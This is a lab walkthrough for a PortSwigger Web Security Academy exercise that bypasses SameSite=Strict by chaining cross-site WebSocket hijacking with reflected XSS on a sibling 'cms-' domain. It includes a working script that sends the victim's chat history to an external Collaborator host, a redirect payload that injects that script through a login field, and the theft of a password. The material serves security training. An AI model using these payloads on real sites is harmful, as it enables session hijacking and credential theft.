# CSRF - SameSite Strict bypass via sibling domain

## üìå Lab Details
- **Title**: SameSite Strict bypass via sibling domain
- **Difficulty**: Practitioner
- **Category**: Cross-site Request Forgery
- **Lab URL**: https://portswigger.net/academy/labs/launch/44cca99334d60d91033bf4bd0908a142896514af0a3c0c343f8017fe71781ae9?referrer=%2fweb-security%2fcsrf%2fbypassing-samesite-restrictions%2flab-samesite-strict-bypass-via-sibling-domain

## üîç Summary
This lab demonstrates a **cross-site WebSocket hijacking (CSWSH)** vulnerability, which helps in bypassing the `SameSite=Strict` restriction.

## üõ† Steps to Solve
1. Go to the live chat feature and send a few messages.
2. Study the **Webscocket** handshake request: `GET /chat`. Observe that this doesn't contains any unpredictable tokens, means might be vulnerable to **CSWSH**.
3. Study the **Websocket** history tab, the browser sends a `READY` message to the server, which causes the server to respond with the entire history.
4. Go to the **Collaborator** tab to copy a collaborator payload.
5. Inject this exploit into the exploit server:
   ```sh
   <script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
    </script>
    ```
6. On studying the **HTTP** requests, it shows that you have opened up a new connection, even though **CSWSH** vulnerability exists, the reason is the presence of `SameSite=Strict` restriction.
7. Study the **proxy** history to find a sibling domain: `cms-YOUR-LAB-ID.web-security-academy.net`.
8. Try injecting an **XSS** payload into this sibling domain: `<script>alert(1)</script>`.
9. Observe that the alert(1) is called, confirming that this is a viable reflected XSS vector.
10. Recreate the CSWSH script that you tested on the exploit server earlier.
11. URL encode the entire script.
12. Now, induce a `GET` request in the browser by delivering a exploit through the exploit server:
    ```sh
    <script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
    </script>
    ```
13. Deliver the exploit to the victim.
14. Now the `HTTP` history contains all the chat of the user.
15. Extract the **username** and **password** and log in to the lab to complete it.

## üìñ Key Takeaways
- `SameSite=Strict` restriction can be bypassed if the website contains both `CSRF` and `XSS` vulnerability.
-  A **sibling domain (cms-...)** under the same site is considered `"same-site"` by the browser, allowing cookies to be sent.
-  **WebSocket** connections inherit `cookies` when initiated from the same-site sibling domain, enabling hijacking of the chat session.
